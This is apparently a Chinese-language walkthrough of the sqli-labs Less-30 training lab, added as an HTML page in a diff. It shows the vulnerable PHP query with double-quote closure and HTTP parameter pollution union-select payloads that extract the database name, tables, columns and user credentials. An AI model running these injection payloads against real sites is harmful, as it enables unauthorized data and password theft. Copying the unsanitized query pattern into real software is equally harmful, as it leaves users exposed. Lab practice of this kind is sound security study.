@@ -1,0 +1,29 @@
+<hr>
+<h2 id="title-less30url-https-www-yuque-com-u29002979-ep2zrx-zyusq4qg670kl2g0"><a href="#title-less30url-https-www-yuque-com-u29002979-ep2zrx-zyusq4qg670kl2g0" class="headerlink" title="title: less30url: https://www.yuque.com/u29002979/ep2zrx/zyusq4qg670kl2g0"></a>title: less30<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/zyusq4qg670kl2g0">https://www.yuque.com/u29002979/ep2zrx/zyusq4qg670kl2g0</a></h2><pre><code class="bash">$id = &#39;&quot;&#39; .$id. &#39;&quot;&#39;;
+$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
+
+$id = &#39;&quot;&#39; .$id. &#39;&quot;&#39;;
+$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
+</code></pre>
+<p>与Less29的区别为闭合方式为双引号”</p>
+<blockquote>
+<p>This Site Protected by Worlds Best WAF<br>本网站受世界最佳WAF保护</p>
+</blockquote>
+<p><code>?id=1&amp;id=1&quot; and 1=&quot;1</code>闭合<br>双引号闭合</p>
+<p><a name="ohpIT"></a></p>
+<h1 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h1><p><a name="iQW9u"></a></p>
+<h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><blockquote>
+<p><strong>?id&#x3D;1&amp;id&#x3D;0”</strong></p>
+</blockquote>
+<pre><code class="bash">查看当前数据库名称
+?id=1&#39;&amp;id=0&quot; union select 1,2,(select database()) --+
+
+查看数据表名称
+?id=1&#39;&amp;id=0&quot; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+
+
+爆破字段名称
+?id=1&amp;id=0&quot; union select 1,2,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;)--+
+
+爆破字段内容 
+?id=1&amp;id=0&quot; union select 1,2,(select group_concat(username,0x7e,password)from security.users )--+
+</code></pre>
